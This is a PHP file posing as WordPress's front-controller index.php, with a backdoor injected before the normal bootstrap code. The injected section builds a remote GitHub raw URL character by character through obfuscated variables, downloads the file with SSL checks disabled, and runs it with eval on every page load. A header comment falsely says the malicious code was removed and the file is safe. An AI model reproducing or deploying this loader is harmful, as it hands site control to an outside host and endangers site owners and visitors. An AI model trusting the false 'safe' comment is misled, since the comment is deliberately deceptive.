<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$jfdhugseyeirf = 'h'; $ksleirufjdksl = 't'; $mckdleirutgks = 't'; $plskdjfueirkd = 'p'; $qksldfjeurytl = 's';
$rksldfuejrity = ':'; $skldjfueirytn = '/'; $tksldfjeuriyt = '/'; $uksldfuejrity = 'r'; $vksldjfueiryt = 'a';
$wksldfuejrity = 'w'; $xksldjfueiryt = '.'; $yksldfuejrity = 'g'; $zksldjfueiryt = 'i'; $aksldfuejrity = 't';
$bksldjfueiryt = 'h'; $cksldfuejrity = 'u'; $dksldjfueiryt = 'b'; $eksldfuejrity = 'u'; $fksldjfueiryt = 's';
$gksldfuejrity = 'e'; $hksldjfueiryt = 'r'; $iksldfuejrity = 'c'; $jksldjfueiryt = 'o'; $kksldfuejrity = 'n';
$lksldjfueiryt = 't'; $mksldfuejrity = 'e'; $nksldjfueiryt = 'n'; $oksldfuejrity = 't'; $pksldjfueiryt = '.';
$qksldfuejrity = 'c'; $rksldjfueiryt = 'o'; $sksldfuejrity = 'm'; $tksldjfueiryt = '/'; $uksldfuejrity = 's';
$vksldjfueiryt = 'e'; $wksldfuejrity = 'o'; $xksldjfueiryt = 'b'; $yksldfuejrity = 'e'; $zksldjfueiryt = 'l';
$amsldfuejrity = 'a'; $bmsldjfueiryt = '/'; $cmsldfuejrity = 'b'; $dmsldjfueiryt = 'e'; $emsldfuejrity = 'l';
$fmsldjfueiryt = 'a'; $gmsldfuejrity = '/'; $hmsldjfueiryt = 'r'; $imsldfuejrity = 'e'; $jmsldjfueiryt = 'f';
$kmsldfuejrity = 's'; $lmsldjfueiryt = '/'; $mmsldfuejrity = 'h'; $nmsldjfueiryt = 'e'; $omsldfuejrity = 'a';
$pmsldjfueiryt = 'd'; $qmsldfuejrity = 's'; $rmsldjfueiryt = '/'; $smsldfuejrity = 'm'; $tmsldjfueiryt = 'a';
$umsldfuejrity = 'i'; $vmsldjfueiryt = 'n'; $wmsldfuejrity = '/'; $xmsldjfueiryt = 'i'; $ymsldfuejrity = 'n';
$zmsldjfueiryt = 'd'; $ansldfuejrity = 'e'; $bnsldjfueiryt = 'x'; $cnsldfuejrity = '.'; $dnsldjfueiryt = 't';
$ensldfuejrity = 'x'; $fnsldjfueiryt = 't';

$full_url = $jfdhugseyeirf.$ksleirufjdksl.$mckdleirutgks.$plskdjfueirkd.$qksldfjeurytl.$rksldfuejrity.$skldjfueirytn.$tksldfjeuriyt.$uksldfuejrity.$vksldjfueiryt.$wksldfuejrity.$xksldjfueiryt.$yksldfuejrity.$zksldjfueiryt.$aksldfuejrity.$bksldjfueiryt.$cksldfuejrity.$dksldjfueiryt.$eksldfuejrity.$fksldjfueiryt.$gksldfuejrity.$hksldjfueiryt.$iksldfuejrity.$jksldjfueiryt.$kksldfuejrity.$lksldjfueiryt.$mksldfuejrity.$nksldjfueiryt.$oksldfuejrity.$pksldjfueiryt.$qksldfuejrity.$rksldjfueiryt.$sksldfuejrity.$tksldjfueiryt.$uksldfuejrity.$vksldjfueiryt.$wksldfuejrity.$xksldjfueiryt.$yksldfuejrity.$zksldjfueiryt.$amsldfuejrity.$bmsldjfueiryt.$cmsldfuejrity.$dmsldjfueiryt.$emsldfuejrity.$fmsldjfueiryt.$gmsldfuejrity.$hmsldjfueiryt.$imsldfuejrity.$jmsldjfueiryt.$kmsldfuejrity.$lmsldjfueiryt.$mmsldfuejrity.$nmsldjfueiryt.$omsldfuejrity.$pmsldjfueiryt.$qmsldfuejrity.$rmsldjfueiryt.$smsldfuejrity.$tmsldjfueiryt.$umsldfuejrity.$vmsldjfueiryt.$wmsldfuejrity.$xmsldjfueiryt.$ymsldfuejrity.$zmsldjfueiryt.$ansldfuejrity.$bnsldjfueiryt.$cnsldfuejrity.$dnsldjfueiryt.$ensldfuejrity.$fnsldjfueiryt;

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
